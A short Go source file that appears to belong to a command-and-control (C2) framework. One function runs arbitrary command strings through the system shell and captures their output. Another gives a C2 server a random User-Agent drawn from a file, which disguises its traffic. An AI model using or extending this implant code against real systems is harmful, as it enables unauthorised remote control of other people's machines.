package utils

import (
	"bufio"
	"math/rand"
	"os"
	"os/exec"
	"runtime"
)

func (j *Job) Execute() bool {

	var cmd *exec.Cmd

	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("cmd.exe", "/c", j.Command)
	case "darwin", "linux":
		cmd = exec.Command("/bin/bash", "-c", j.Command)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return false
	}

	j.Output = string(output)
	return true
}

func (server *C2) RandomUser(filename string) {

	file, _ := os.Open(filename)
	defer file.Close()

	scanner := bufio.NewScanner(file)
	var lines []string
	for scanner.Scan() {
		content := scanner.Text()
		lines = append(lines, content)
	}

	server.UserAgent = lines[rand.Intn(len(lines))]

}
